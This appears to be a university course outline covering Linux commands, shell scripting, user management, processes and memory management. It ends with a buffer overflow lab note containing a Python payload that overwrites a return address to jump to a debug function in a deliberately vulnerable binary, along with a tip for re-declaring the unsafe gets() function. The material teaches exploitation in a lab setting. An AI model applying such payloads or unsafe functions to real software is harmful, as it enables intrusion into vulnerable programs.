1. Basic Linux commands

   1. ls
   1. cd
   1. pwd
   1. mkdir
   1. rmdir
   1. touch
   1. rm
   1. cp
   1. mv

1. More Linux commands

   1. grep
   1. find
   1. cat
   1. whatis
   1. df
   1. uptime
   1. wget/curl
   1. package management with apt

1. Shell scripting

   1. What is a Shell Script?
   1. How write Your First Shell Script
   1. Variables
   1. User Input
   1. Conditional Statements
   1. Loops
   1. Functions
   1. Script Arguments
   1. Practical Examples

1. User Management

   1. Understanding User and Group Concepts
   1. Creating Users
   1. Managing Passwords
   1. Modifying Users
   1. Deleting Users
   1. Creating and Managing Groups
   1. Viewing User and Group Information
   1. Best Practices

1. Linux file system and file security

   1. chmod
   1. chown

1. Processes creation

   1. top/htop
   1. ps aux
   1. kill

1. Introduction to Threads programming

1. CPU scheduling and scheduling algorithms

   > Mid-Term practical exam (capture the flag)

1. Main memory management

1. Virtual memory management

1. Multithreading/Multi-cores programming

   > Course project
   > Examples: Mini-shell, Custom Kernel, etc...

> \[!NOTE\]
> The Buffer overflow examples
> clone https://github.com/lowlevellearning/secure-server-stuff.git
> objdump -d ./hacked | less and search for the debug func
> add char \*gets(char \*str); // Declare gets() manually to the hacked.c

```python
# 080491e6 = debug address
import sys

payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCEEEE"

payload += b"\x08\x04\x91\xe6"[::-1]

sys.stdout.buffer.write(payload)
```

> (python3 ./exploit.py;cat) | ./hacked
